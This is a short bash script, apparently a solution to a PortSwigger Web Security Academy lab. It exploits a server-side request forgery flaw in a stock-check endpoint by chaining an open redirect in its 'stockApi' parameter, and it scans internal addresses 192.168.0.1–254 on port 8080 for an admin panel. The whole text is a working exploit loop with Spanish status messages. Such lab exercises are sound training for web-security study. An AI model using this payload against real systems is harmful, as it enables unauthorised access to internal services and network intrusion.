for i in {1..254}; do
  echo -n "Probando 192.168.0.$i: "
  curl -s -X POST -d "stockApi=/product/nextProduct?path=http://192.168.0.$i:8080/admin" \
  "https://0af6008b0347bcf581f2934f004500a7.web-security-academy.net/product/stock" | grep -q "admin" && echo "¡ENCONTRADA!" || echo "Fallo"
done
